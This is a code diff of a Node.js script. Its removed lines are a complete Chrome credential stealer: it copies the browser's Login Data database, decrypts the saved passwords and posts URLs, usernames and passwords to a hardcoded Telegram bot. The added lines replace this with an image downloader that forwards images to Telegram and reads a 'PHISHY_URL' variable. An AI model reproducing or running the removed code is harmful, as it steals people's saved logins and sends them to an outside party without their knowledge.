@@ -1,103 +1,141 @@
 const fs = require('fs');
 const path = require('path');
-const os = require('os');
-const { execSync } = require('child_process');
-const crypto = require('crypto');
 const axios = require('axios');
-const sqlite3 = require('sqlite3').verbose();
+const FormData = require('form-data');
+const { createLogger, format, transports } = require('winston');
+const { Command } = require('commander');
+const FileType = require('file-type');
+require('dotenv').config();
 
-// Configuration
-const CHROME_PASSWORDS_PATH = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data');
-const TELEGRAM_BOT_TOKEN = '7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E';
-const TELEGRAM_CHAT_ID = '5375214810';
+// Initialize Winston Logger
+const logger = createLogger({
+    level: 'info',
+    format: format.combine(format.timestamp(), format.json()),
+    transports: [
+        new transports.Console(),
+        new transports.File({ filename: 'app.log' }),
+    ],
+});
 
-// Function to copy the Chrome passwords file
-function copyChromePasswordsFile() {
-    const tempFilePath = path.join(os.tmpdir(), 'chrome_passwords_temp.db');
+// Configuration from Environment Variables
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const IMAGE_FOLDER = process.env.IMAGE_FOLDER || 'downloaded_images';
+const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB
+
+// Ensure the image folder exists
+if (!fs.existsSync(IMAGE_FOLDER)) {
+    fs.mkdirSync(IMAGE_FOLDER, { recursive: true });
+}
+
+// CLI Setup
+const program = new Command();
+program
+    .option('-u, --url <url>', 'URL of the image to download')
+    .option('-c, --chat-id <chatId>', 'Telegram chat ID')
+    .parse(process.argv);
+
+const options = program.opts();
+
+// Validate URL
+function isValidUrl(url) {
     try {
-        fs.copyFileSync(CHROME_PASSWORDS_PATH, tempFilePath);
-        console.log('Chrome passwords file copied successfully:', tempFilePath);
-        return tempFilePath;
+        new URL(url);
+        return true;
     } catch (error) {
-        console.error('Failed to copy Chrome passwords file:', error);
-        return null;
+        return false;
     }
 }
 
-// Function to extract passwords from the copied file
-function extractPasswords(filePath) {
-    const passwords = [];
-    try {
-        const db = new sqlite3.Database(filePath);
-        db.serialize(() => {
-            db.each("SELECT action_url, username_value, password_value FROM logins", (err, row) => {
-                if (err) {
-                    console.error('Error reading passwords:', err);
-                    return;
-                }
-                const decryptedPassword = decryptPassword(row.password_value);
-                passwords.push({
-                    url: row.action_url,
-                    username: row.username_value,
-                    password: decryptedPassword
-                });
+// Download Image with Retry Logic
+async function downloadImage(url, savePath, retries = 3) {
+    for (let i = 0; i < retries; i++) {
+        try {
+            const response = await axios({
+                url,
+                responseType: 'stream',
             });
-        });
-        db.close();
-        console.log('Passwords extracted successfully:', passwords.length);
-        return passwords;
-    } catch (error) {
-        console.error('Failed to extract passwords:', error);
-        return null;
-    }
-}
 
-// Function to decrypt Chrome passwords
-function decryptPassword(encryptedPassword) {
-    try {
-        const key = execSync('powershell -Command "Get-ItemProperty -Path \'HKCU:\\Software\\Google\\Chrome\\User Data\\Local State\' | Select-Object -ExpandProperty \'os_crypt\' | Select-Object -ExpandProperty \'encrypted_key\'"').toString().trim();
-        const decodedKey = Buffer.from(key, 'base64').slice(5);
-        const iv = encryptedPassword.slice(3, 15);
-        const payload = encryptedPassword.slice(15);
-        const decipher = crypto.createDecipheriv('aes-256-gcm', decodedKey, iv);
-        let decrypted = decipher.update(payload, 'binary', 'utf8');
-        decrypted += decipher.final('utf8');
-        return decrypted;
-    } catch (error) {
-        console.error('Failed to decrypt password:', error);
-        return 'DECRYPTION_FAILED';
-    }
-}
+            if (response.status === 200) {
+                const contentLength = response.headers['content-length'];
+                if (contentLength > MAX_FILE_SIZE) {
+                    throw new Error('Image is too large');
+                }
 
-// Function to send passwords to Telegram bot
-function sendPasswordsToTelegram(passwords) {
-    const message = passwords.map(entry => 
-        `URL: ${entry.url}\nUsername: ${entry.username}\nPassword: ${entry.password}`
-    ).join('\n\n');
+                const writer = fs.createWriteStream(savePath);
+                response.data.pipe(writer);
 
-    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: `Extracted Passwords:\n\n${message}`
-    })
-    .then(response => {
-        console.log('Passwords sent to Telegram bot successfully.');
-    })
-    .catch(error => {
-        console.error('Failed to send passwords to Telegram bot:', error.response ? error.response.data : error.message);
-    });
-}
-
-// Main function
-function main() {
-    const tempFilePath = copyChromePasswordsFile();
-    if (tempFilePath) {
-        const passwords = extractPasswords(tempFilePath);
-        if (passwords && passwords.length > 0) {
-            sendPasswordsToTelegram(passwords);
-        } else {
-            console.error('No passwords extracted.');
+                return new Promise((resolve, reject) => {
+                    writer.on('finish', async () => {
+                        const fileInfo = await FileType.fromFile(savePath);
+                        if (!fileInfo || !fileInfo.mime.startsWith('image/')) {
+                            fs.unlinkSync(savePath); // Delete the file if it's not an image
+                            throw new Error('Downloaded file is not an image');
+                        }
+                        logger.info(`Image successfully downloaded: ${savePath}`);
+                        resolve();
+                    });
+                    writer.on('error', reject);
+                });
+            } else {
+                logger.error(`Failed to download image from ${url}`);
+            }
+        } catch (error) {
+            logger.error(`Attempt ${i + 1}: Error downloading image:`, error);
+            if (i === retries - 1) throw error; // Throw error after last retry
         }
     }
 }
 
-main();
+// Send Image to Telegram
+async function sendImageToTelegram(chatId, imagePath) {
+    try {
+        const form = new FormData();
+        form.append('chat_id', chatId);
+        form.append('photo', fs.createReadStream(imagePath));
+
+        const response = await axios.post(
+            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+            form,
+            {
+                headers: form.getHeaders(),
+            }
+        );
+
+        if (response.data.ok) {
+            logger.info(`Image sent to Telegram chat ID: ${chatId}`);
+        } else {
+            logger.error('Failed to send image to Telegram:', response.data);
+        }
+    } catch (error) {
+        logger.error('Error sending image to Telegram:', error);
+    }
+}
+
+// Main Function
+async function main() {
+    try {
+        const url = options.url || process.env.PHISHY_URL;
+        const chatId = options.chatId || TELEGRAM_CHAT_ID;
+
+        if (!isValidUrl(url)) {
+            logger.error('Invalid URL provided');
+            return;
+        }
+
+        const imageFormat = path.extname(new URL(url).pathname).toLowerCase() || '.jpg';
+        const imageName = `image_${Date.now()}${imageFormat}`;
+        const imagePath = path.join(IMAGE_FOLDER, imageName);
+
+        await downloadImage(url, imagePath);
+        await sendImageToTelegram(chatId, imagePath);
+    } catch (error) {
+        logger.error('Error in main function:', error);
+    }
+}
+
+// Run the Program
+main().catch((error) => {
+    logger.error('Unhandled error:', error);
+    process.exit(1);
+});
